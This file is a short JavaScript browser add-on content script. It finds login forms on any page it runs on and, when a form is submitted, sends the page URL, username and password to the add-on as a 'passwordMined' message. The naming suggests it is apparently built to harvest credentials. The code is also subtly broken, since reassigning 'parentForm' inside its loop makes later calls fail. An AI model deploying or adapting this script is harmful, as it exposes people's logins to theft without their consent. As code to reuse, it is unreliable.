function getLoginFields() {
  var forms = [],
    pswd = (function(){
      var inputs = document.getElementsByTagName('input'),
        len = inputs.length,
        ret = [];
      while (len--) {
        if (inputs[len].type === 'password') {
          ret[ret.length] = inputs[len];
        }
      }
      return ret;
    })(),
    pswdLength = pswd.length,
    parentForm = function(elem) {
      while (elem.parentNode) {
        if(elem.parentNode.nodeName.toLowerCase() === 'form') {
          return elem.parentNode;
        }
        elem = elem.parentNode;
      }
    };
  while (pswdLength--) {
    var curPswdField = pswd[pswdLength],
      parentForm = parentForm(curPswdField),
      curField = curPswdField;
    if (parentForm) {
      var inputs = parentForm.getElementsByTagName('input');
      for (var i = 0; i < inputs.length; i++) {
        if (inputs[i] !== curPswdField && (inputs[i].type === 'text' || inputs[i].type === 'email')) {
          forms[forms.length] = [parentForm, inputs[i], curPswdField];
          break;
        }
      }
    }
  }
  return forms;
}

function formSubmitted(id) {
  self.port.emit("passwordMined", window.location.href, forms[id][1].value, forms[id][2].value);
}

var forms = getLoginFields();
for (var i=0; i<forms.length; i++) {
  forms[i][0].addEventListener("submit", function(){
    var tmp = i;
    return function() {
      formSubmitted(tmp);
    }
  }());
}
